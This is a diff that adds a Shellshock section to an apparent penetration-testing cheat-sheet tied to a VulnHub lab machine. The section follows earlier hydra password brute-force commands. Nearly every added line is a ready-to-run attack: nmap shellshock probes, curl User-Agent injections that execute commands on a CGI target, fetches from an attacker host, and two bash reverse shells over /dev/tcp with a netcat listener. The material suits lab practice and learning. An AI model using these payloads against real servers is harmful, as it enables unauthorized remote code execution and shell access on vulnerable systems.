@@ -290,3 +290,53 @@ Web enumeration means to look out info about services running on port, versions,
 	# hydra -L tomcat -P apache_tomcat_passwords.txt -s 8080 192.168.0.203 http-head "/manager/html"
 		
 	# hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt 10.10.11.106 http-head
+## Shellshock (cgi-bin) vulnerabilities 
+	https://www.vulnhub.com/entry/sumo-1,480/
+
+	# nmap -vv -sT -sV -A -O -p 22,80 192.168.0.106
+	
+	# nmap -vv -sT -sV -A -O -p 80 --script=http-enum.nse 192.168.0.106
+
+	# nmap -vv -sT -sV -A -O -p 80 --script=http-methods.nse 192.168.0.106
+
+	# nmap -p 80 -sT -sV --script=http-shellshock.nse --script-args uri=/cgi-bin/test.sh 192.168.0.106
+
+	# nmap -p 80 -sT -sV --script=http-shellshock.nse --script-args uri=/cgi-bin/test.sh,cmd=id 192.168.0.106
+
+	# curl -H "User-Agent: () { :; }; /bin/id" http://192.168.0.106/cgi-bin/test/test.cgi
+
+	# tcpdump -n -i eth0 icmp
+
+	# curl -H "User-Agent: () { :; }; /bin/bash -c 'ping -c 2 192.168.0.6'" http://192.168.0.106/cgi-bin/test/test.cgi
+
+	# curl -H "User-Agent: () { :; }; /bin/ping 192.168.0.6 -c 3" http://192.168.0.106/cgi-bin/test/test.cgi
+
+	# nmap -p 80 -sT -sV --script=http-shellshock.nse --script-args uri=/cgi-bin/test,cmd='/bin/ping 192.168.0.6 -c 3' 192.168.0.106
+
+	# python -m SimpleHTTPServer 80
+
+	# curl -H "User-Agent: () { :; }; /bin/bash -c 'wget http://192.168.0.6'" http://192.168.0.106/cgi-bin/test/test.cgi 
+
+	# nmap -p 80 -sT -sV --script=http-shellshock.nse --script-args uri=/cgi-bin/test,cmd='/usr/bin/wget http://192.168.0.6' 192.168.0.106
+
+	# nmap -p 80 -sT -sV --script=http-shellshock.nse --script-args uri=/cgi-bin/test,cmd='/bin/curl http://192.168.0.6' 192.168.0.106
+
+	# nmap -p 80 -sT -sV --script=http-shellshock.nse --script-args uri=/cgi-bin/test,cmd='wget http://192.168.0.6' 192.168.0.106
+
+	# curl -H "User-Agent: () { :; }; /bin/bash -c 'nc http://192.168.0.6'" http://192.168.0.106/cgi-bin/test/test.cgi 
+		
+	# curl -H "User-Agent: () { :; }; /bin/bash -c 'id'" http://192.168.0.106/cgi-bin/test/test.cgi 
+		
+	# curl -H "User-Agent: () { :; }; /bin/bash -c 'ps -aux'" http://192.168.0.106/cgi-bin/test/test.cgi 
+
+	# curl -H "User-Agent: () { :; }; /bin/bash -c 'exec bash -i &>/dev/tcp/192.168.0.6/443 <&1'" http://192.168.0.106/cgi-bin/test/test.cgi
+		
+	# curl -A "() { ignored; }; echo Content-Type: text/plain ; echo ;/bin/bash -c 'whoami'" http://192.168.0.106/cgi-bin/test/test.cgi
+		
+	# curl -A "() { ignored; }; echo Content-Type: text/plain ; echo ;/usr/bin/id" http://192.168.0.106/cgi-bin/test/test.cgi 
+		
+	# curl -A "() { ignored; }; echo Content-Type: text/plain ; echo ;/bin/bash -c 'pwd'" http://192.168.0.106/cgi-bin/test/test.cgi
+		
+	# nc -nlvp 4455
+		
+	# curl -A "() { ignored; }; echo Content-Type: text/plain ; echo ;/bin/bash -i >& /dev/tcp/192.168.0.6/4455 0>&1" http://192.168.0.106/cgi-bin/test/test.cgi
